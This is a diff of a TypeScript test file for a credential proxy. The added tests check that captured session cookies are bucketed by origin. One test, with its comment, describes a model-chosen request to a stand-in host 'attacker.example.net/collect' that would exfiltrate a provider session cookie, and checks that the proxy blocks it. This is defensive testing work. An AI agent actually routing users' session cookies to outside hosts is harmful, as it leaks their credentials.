@@ -9,7 +9,7 @@
  */
 
 import { describe, it, expect, mock } from "bun:test";
-import { executeApiCall, type ApiCallDeps } from "../credential-proxy.ts";
+import { cookieBucketKey, executeApiCall, type ApiCallDeps } from "../credential-proxy.ts";
 import { _setLogSinkForTesting } from "../logger.ts";
 import type { CredentialsResponse } from "../helpers.ts";
 
@@ -125,7 +125,11 @@ describe("executeApiCall — happy path", () => {
       expect(text).toBe('{"data":42}');
       expect(result.authRefreshed).toBe(false);
     }
-    expect(deps.cookieJar.get("gmail")).toEqual(["sess=abc"]);
+    // Bucketed by (integration, gate, capture origin) — the default creds
+    // declare an allowlist, so this call was allowlist-gated.
+    expect(
+      deps.cookieJar.get(cookieBucketKey("gmail", "allowlist", "https://api.example.com")),
+    ).toEqual(["sess=abc"]);
     // Verify Authorization was server-side injected.
     const callArgs = fetchFn.mock.calls[0]!;
     const init = callArgs[1] as RequestInit & { headers: Record<string, string> };
@@ -417,7 +421,10 @@ describe("executeApiCall — multi-hop redirect cookie capture (#473)", () => {
     expect(result.ok).toBe(true);
     if (result.ok) expect(result.response.status).toBe(200);
     expect(calls).toBe(3);
-    const jar = deps.cookieJar.get("kijiji");
+    // The whole chain lands in the bucket of the INITIAL target's origin.
+    const jar = deps.cookieJar.get(
+      cookieBucketKey("kijiji", "allowlist", "https://api.example.com"),
+    );
     // Pre-fix: ["step1=A", "last=Z"] — session=XYZ is missing.
     // Post-fix: all three cookies merged into the jar.
     expect(jar).toContain("step1=A");
@@ -682,7 +689,9 @@ describe("executeApiCall — multi-hop redirect cookie capture (#473)", () => {
     // credential header into a cross-origin redirect.
     const init = fetchFn.mock.calls[0]![1] as RequestInit;
     expect(init.redirect).toBe("manual");
-    expect(deps.cookieJar.get("demo")).toEqual(["final=F"]);
+    expect(
+      deps.cookieJar.get(cookieBucketKey("demo", "allowlist", "https://api.example.com")),
+    ).toEqual(["final=F"]);
   });
 
   it("propagates caller-supplied Cookie header across all hops (jar wins on dup)", async () => {
@@ -1693,5 +1702,202 @@ describe("executeApiCall — SSRF DNS-rebind layer", () => {
     expect(result.ok).toBe(false);
     if (!result.ok) expect(result.status).toBe(403);
     expect(resolveHost).not.toHaveBeenCalled();
+  });
+});
+
+describe("executeApiCall — cookie jar is scoped to the capture origin", () => {
+  /**
+   * Records the `Cookie` header of every outbound request and always answers
+   * 200, optionally setting a cookie on the first response.
+   */
+  function recordingFetch(setCookieOnFirst?: string) {
+    const cookiesSeen: (string | null)[] = [];
+    let first = true;
+    const fetchFn = mock(async (_url: string | URL, init?: RequestInit) => {
+      cookiesSeen.push(new Headers(init?.headers).get("cookie"));
+      const headers: Record<string, string> = { "Content-Type": "application/json" };
+      if (first && setCookieOnFirst) headers["Set-Cookie"] = setCookieOnFirst;
+      first = false;
+      return new Response("{}", { status: 200, headers });
+    });
+    return { cookiesSeen, fetchFn: fetchFn as unknown as typeof fetch };
+  }
+
+  /**
+   * The `allow_all_uris` shape: the agent picks the host on every call, so
+   * nothing host-specific gates the destination.
+   */
+  const allowAllCreds = mock(async (): Promise<CredentialsResponse> => ({
+    credentials: { access_token: "tok-123" },
+    authorizedUris: null,
+    allowAllUris: true,
+    credentialHeaderName: "Authorization",
+    credentialHeaderPrefix: "Bearer",
+    credentialFieldName: "access_token",
+  }));
+
+  it("does not replay a session cookie on a different host under allow_all_uris", async () => {
+    // The exfiltration this scoping exists to stop: the provider hands the
+    // sidecar a live session cookie, then the model names any host it likes
+    // and the jar ships the cookie there. `substitutesCredential` never fires
+    // — a replayed cookie carries no `{{field}}` template.
+    const { cookiesSeen, fetchFn } = recordingFetch("sess=PROVIDER-SESSION; Path=/; HttpOnly");
+    const deps = makeDeps({ fetchFn, fetchCredentials: allowAllCreds });
+
+    await executeApiCall(
+      {
+        integrationId: "kijiji",
+        targetUrl: "https://provider.example.com/login",
+        method: "GET",
+        callerHeaders: {},
+        body: { kind: "none" },
+      },
+      deps,
+    );
+    await executeApiCall(
+      {
+        integrationId: "kijiji",
+        targetUrl: "https://attacker.example.net/collect",
+        method: "GET",
+        callerHeaders: {},
+        body: { kind: "none" },
+      },
+      deps,
+    );
+
+    expect(cookiesSeen).toHaveLength(2);
+    expect(cookiesSeen[0]).toBeNull();
+    expect(cookiesSeen[1] ?? "").not.toContain("PROVIDER-SESSION");
+    // The cookie is still held for its own origin — this is scoping, not a
+    // disabled jar.
+    expect(
+      deps.cookieJar.get(cookieBucketKey("kijiji", "open", "https://provider.example.com")),
+    ).toEqual(["sess=PROVIDER-SESSION"]);
+  });
+
+  it("still replays it on the same origin (sticky sessions keep working)", async () => {
+    const { cookiesSeen, fetchFn } = recordingFetch("sess=PROVIDER-SESSION; Path=/");
+    const deps = makeDeps({ fetchFn, fetchCredentials: allowAllCreds });
+
+    for (const target of [
+      "https://provider.example.com/login",
+      "https://provider.example.com/inbox",
+    ]) {
+      await executeApiCall(
+        {
+          integrationId: "kijiji",
+          targetUrl: target,
+          method: "GET",
+          callerHeaders: {},
+          body: { kind: "none" },
+        },
+        deps,
+      );
+    }
+    expect(cookiesSeen[1]).toContain("sess=PROVIDER-SESSION");
+  });
+
+  it("scopes by full origin, not by host — a scheme/port change is a different origin", async () => {
+    const { cookiesSeen, fetchFn } = recordingFetch("sess=PROVIDER-SESSION");
+    const deps = makeDeps({ fetchFn, fetchCredentials: allowAllCreds });
+
+    await executeApiCall(
+      {
+        integrationId: "kijiji",
+        targetUrl: "https://provider.example.com/login",
+        method: "GET",
+        callerHeaders: {},
+        body: { kind: "none" },
+      },
+      deps,
+    );
+    await executeApiCall(
+      {
+        integrationId: "kijiji",
+        targetUrl: "https://provider.example.com:8443/inbox",
+        method: "GET",
+        callerHeaders: {},
+        body: { kind: "none" },
+      },
+      deps,
+    );
+    expect(cookiesSeen[1] ?? "").not.toContain("PROVIDER-SESSION");
+  });
+
+  it("replays across sibling hosts when BOTH are inside authorized_uris", async () => {
+    // The Dropbox `api ⇄ content` case the redirect follower already honours
+    // for a single call — the same stance, applied across calls.
+    const dropboxCreds = mock(async (): Promise<CredentialsResponse> => ({
+      credentials: { access_token: "tok-123" },
+      authorizedUris: ["https://api.dropboxapi.com/**", "https://content.dropboxapi.com/**"],
+      allowAllUris: false,
+      credentialHeaderName: "Authorization",
+      credentialHeaderPrefix: "Bearer",
+      credentialFieldName: "access_token",
+    }));
+    const { cookiesSeen, fetchFn } = recordingFetch("sess=DROPBOX");
+    const deps = makeDeps({ fetchFn, fetchCredentials: dropboxCreds });
+
+    await executeApiCall(
+      {
+        integrationId: "dropbox",
+        targetUrl: "https://api.dropboxapi.com/2/files/list",
+        method: "GET",
+        callerHeaders: {},
+        body: { kind: "none" },
+      },
+      deps,
+    );
+    await executeApiCall(
+      {
+        integrationId: "dropbox",
+        targetUrl: "https://content.dropboxapi.com/2/files/download",
+        method: "GET",
+        callerHeaders: {},
+        body: { kind: "none" },
+      },
+      deps,
+    );
+    expect(cookiesSeen[1]).toContain("sess=DROPBOX");
+  });
+
+  it("does not lend an allow_all-captured cookie to an allowlisted host", async () => {
+    // An integration can declare BOTH `allow_all_uris` and an allowlist. A
+    // cookie captured on an agent-chosen host was never inside the declared
+    // boundary, so an allowlist-gated call must not carry it.
+    const hybridCreds = mock(async (): Promise<CredentialsResponse> => ({
+      credentials: { access_token: "tok-123", pin: "s3cr3t" },
+      authorizedUris: ["https://api.example.com/**"],
+      allowAllUris: true,
+      credentialHeaderName: "Authorization",
+      credentialHeaderPrefix: "Bearer",
+      credentialFieldName: "access_token",
+    }));
+    const { cookiesSeen, fetchFn } = recordingFetch("sess=FROM-OPEN-CALL");
+    const deps = makeDeps({ fetchFn, fetchCredentials: hybridCreds });
+
+    // `allow_all_uris` branch: any host, no allowlist gate.
+    await executeApiCall(
+      {
+        integrationId: "hybrid",
+        targetUrl: "https://elsewhere.example.net/x",
+        method: "GET",
+        callerHeaders: {},
+        body: { kind: "none" },
+      },
+      deps,
+    );
+    // Templating a credential downgrades the call to the allowlist branch.
+    await executeApiCall(
+      {
+        integrationId: "hybrid",
+        targetUrl: "https://api.example.com/x?pin={{pin}}",
+        method: "GET",
+        callerHeaders: {},
+        body: { kind: "none" },
+      },
+      deps,
+    );
+    expect(cookiesSeen[1] ?? "").not.toContain("FROM-OPEN-CALL");
   });
 });
